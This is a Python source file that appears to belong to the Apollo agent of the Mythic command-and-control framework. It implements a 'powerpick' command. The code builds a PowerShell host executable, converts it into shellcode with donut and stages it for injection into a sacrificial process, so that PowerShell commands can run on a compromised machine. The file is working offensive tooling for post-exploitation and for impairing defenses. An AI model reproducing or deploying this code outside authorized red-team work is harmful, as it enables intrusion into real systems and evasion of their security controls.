from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
import json
from apollo.mythic.sRDI import ShellcodeRDI
from uuid import uuid4
from mythic_container.MythicRPC import *
from os import path
import asyncio
import donut
import platform 

if platform.system() == 'Windows':  
    POWERSHELL_HOST_PATH = "C:\\Mythic\\Apollo\\srv\\PowerShellHost.exe"
else:
    POWERSHELL_HOST_PATH="/srv/PowerShellHost.exe"

POWERSHELL_FILE_ID=""

class PowerpickArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # CommandParameter(
            #     name="powershell_params",
            #     cli_name="Command",
            #     display_name="Command",
            #     type=ParameterType.String,
            #     description="PowerShell command to execute.",
            # )
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("A command must be passed on the command line to PowerPick.\n\tUsage: {}".format(PowerpickCommand.help_cmd))
        self.add_arg("powershell_params", self.command_line)
        self.add_arg("pipe_name", str(uuid4()))
        pass


class PowerpickCommand(CommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = "powerpick [command]"
    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
    version = 2
    author = "@djhohnstein"
    argument_class = PowerpickArguments
    attackmapping = ["T1059", "T1562"]

    async def build_powershell(self):
        global POWERSHELL_HOST_PATH
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name)
        # shutil to copy payload files over
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/PowerShellHost/PowerShellHost.csproj -o {}/PowerShellHost/bin/Release/".format(agent_build_path.name, agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build PowerShellHost.exe:\n{}".format(stderr.decode() + "\n" + stdout.decode()))
        shutil.copy(outputPath, POWERSHELL_HOST_PATH)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global POWERSHELL_HOST_PATH
        if not path.exists(POWERSHELL_HOST_PATH):
            await self.build_powershell()

        donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=taskData.args.get_arg("pipe_name"))
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=taskData.Task.ID,
            FileContents=donutPic,
            DeleteAfterFetch=True
        ))
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception("Failed to register PowerShellHost.exe: " + file_resp.Error)

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
